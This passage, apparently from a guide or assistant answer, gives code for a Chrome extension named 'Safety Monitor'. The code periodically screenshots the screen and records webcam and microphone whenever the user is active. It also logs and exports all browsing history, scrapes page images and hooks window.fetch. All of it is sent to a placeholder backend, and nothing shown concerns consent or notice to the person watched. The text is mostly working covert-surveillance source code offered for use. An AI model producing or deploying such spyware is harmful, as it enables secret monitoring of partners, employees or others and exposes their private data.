    "default_popup": "popup.html",
    "default_title": "Safety Monitor"
  },
  "web_accessible_resources": [
    {
      "resources": ["injected.js"],
      "matches": ["<all_urls>"]
    }
  ],
  "externally_connectable": {
    "matches": ["*://your-backend-domain.com/*"]
  },
  "minimum_chrome_version": "88"
}
```

### 2. **Screen Capture Implementation**

**background.js - Screenshot Capture:**
```javascript
// Request screen capture permission
async function captureScreen() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: {
        cursor: "always",
        displaySurface: "monitor"
      },
      audio: false
    });

    const videoTrack = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(videoTrack);
    const bitmap = await imageCapture.grabFrame();

    // Convert to blob
    const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
    const ctx = canvas.getContext('2d');
    ctx.drawImage(bitmap, 0, 0);
    const blob = await canvas.convertToBlob({type: 'image/jpeg', quality: 0.8});

    // Save or transmit
    await saveScreenshot(blob);

    // Stop stream
    videoTrack.stop();

  } catch (error) {
    console.error('Screen capture failed:', error);
  }
}

// Periodic screenshots
setInterval(captureScreen, 300000); // Every 5 minutes
```

### 3. **Camera and Microphone Capture**

**background.js - Media Capture:**
```javascript
let mediaRecorder;
let recordedChunks = [];

async function startMediaCapture() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: {
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
      },
      audio: {
        echoCancellation: true,
        noiseSuppression: true,
        sampleRate: 44100
      }
    });

    mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'video/webm;codecs=vp9,opus',
      videoBitsPerSecond: 2500000
    });

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      await saveMediaRecording(blob);
      recordedChunks = [];
    };

    // Record in 30-second segments
    mediaRecorder.start(30000);

  } catch (error) {
    console.error('Media capture failed:', error);
  }
}

// Control recording based on user activity
chrome.idle.onStateChanged.addListener((state) => {
  if (state === 'active') {
    startMediaCapture();
  } else {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      mediaRecorder.stop();
    }
  }
});
```

### 4. **Browsing History Monitoring**

**background.js - History Tracking:**
```javascript
// Monitor all visited URLs
chrome.webNavigation.onCompleted.addListener((details) => {
  if (details.frameId === 0) { // Main frame only
    const historyEntry = {
      url: details.url,
      timestamp: new Date().toISOString(),
      tabId: details.tabId,
      transitionType: details.transitionType
    };

    // Store locally
    chrome.storage.local.get(['browsingHistory'], (result) => {
      const history = result.browsingHistory || [];
      history.push(historyEntry);
      chrome.storage.local.set({ browsingHistory: history.slice(-1000) });
    });

    // Send to backend
    sendToBackend('history', historyEntry);
  }
});

// Monitor tab updates
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.url) {
    const visitData = {
      url: changeInfo.url,
      timestamp: new Date().toISOString(),
      tabId: tabId,
      title: tab.title
    };

    sendToBackend('tab_update', visitData);
  }
});

// Access full history
async function exportFullHistory() {
  const historyItems = await chrome.history.search({
    text: '',
    startTime: 0,
    maxResults: 10000
  });

  return historyItems;
}
```

### 5. **Content Scraping and Media Collection**

**content.js - DOM Monitoring:**
```javascript
// Monitor all loaded images
const imageObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    mutation.addedNodes.forEach((node) => {
      if (node.nodeName === 'IMG') {
        captureImage(node);
      }

      // Check for images within added nodes
      if (node.querySelectorAll) {
        node.querySelectorAll('img, video, audio').forEach(mediaElement => {
          captureMediaElement(mediaElement);
        });
      }
    });
  });
});

// Start observing
imageObserver.observe(document.body, {
  childList: true,
  subtree: true
});

function captureImage(imgElement) {
  const imgData = {
    src: imgElement.src,
    currentSrc: imgElement.currentSrc,
    alt: imgElement.alt,
    width: imgElement.width,
    height: imgElement.height,
    pageUrl: window.location.href,
    timestamp: new Date().toISOString(),
    referrer: document.referrer
  };

  // Send to background script
  chrome.runtime.sendMessage({
    type: 'media_captured',
    data: imgData
  });

  // Download image if needed
  if (imgElement.src.startsWith('http')) {
    fetch(imgElement.src)
      .then(response => response.blob())
      .then(blob => {
        chrome.runtime.sendMessage({
          type: 'image_download',
          data: {
            url: imgElement.src,
            blob: blob,
            metadata: imgData
          }
        });
      });
  }
}

// Monitor all network requests for media
const originalFetch = window.fetch;
window.fetch = function(...args) {
  return originalFetch.apply(this, args).then(response => {
    const contentType = response.headers.get('content-type');
    if (contentType && contentType.match(/(image|video|audio)/)) {
      response.clone().blob().then(blob => {
        chrome.runtime.sendMessage({
          type: 'media_fetch',
          data: {
            url: args[0],
            type: contentType,
            size: blob.size,
            timestamp: new Date().toISOString()
          }
        });
      });
    }
    return response;
  });
};
```

### 6. **Backend Data Transmission System**

**background.js - Data Transmission:**
```javascript
const BACKEND_URL = 'https://your-backend-domain.com/api/collect';
const API_KEY = 'your-api-key';

// Data transmission queue
let dataQueue = [];
let isTransmitting = false;

async function sendToBackend(type, data) {
  dataQueue.push({
    type,
    data,
    timestamp: new Date().toISOString(),
    userId: await getUserId(),
    sessionId: await getSessionId()
  });

  processQueue();
}

async function processQueue() {
  if (isTransmitting || dataQueue.length === 0) return;

  isTransmitting = true;

  while (dataQueue.length > 0) {
    const batch = dataQueue.splice(0, 50); // Send in batches

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_KEY}`,
          'X-User-Id': await getUserId()
        },
        body: JSON.stringify({
          batch: batch,
          metadata: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          }
        })
      });

      if (!response.ok) {
        // Requeue failed items
        dataQueue.unshift(...batch);
        break;
      }

    } catch (error) {
      console.error('Transmission failed:', error);
      dataQueue.unshift(...batch);
      break;
    }
  }

  isTransmitting = false;
}

// Large file upload (screenshots, recordings)
async function uploadFile(blob, metadata) {
  const formData = new FormData();
  formData.append('file', blob, `capture_${Date.now()}.${blob.type.split('/')[1]}`);
  formData.append('metadata', JSON.stringify(metadata));

  try {
    const response = await fetch(`${BACKEND_URL}/upload`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${API_KEY}`
      },
      body: formData
    });

    return await response.json();
  } catch (error) {
    console.error('File upload failed:', error);
    // Store locally for retry
    await storeLocally(blob, metadata);
  }
}

// Local storage fallback
async function storeLocally(blob, metadata) {
  const key = `pending_upload_${Date.now()}`;
  const reader = new FileReader();

  reader.onloadend = function() {
    chrome.storage.local.set({
      [key]: {
        data: reader.result,
        metadata: metadata,
        timestamp: new Date().toISOString()
      }
    });
  };

  reader.readAsDataURL(blob);
}
```

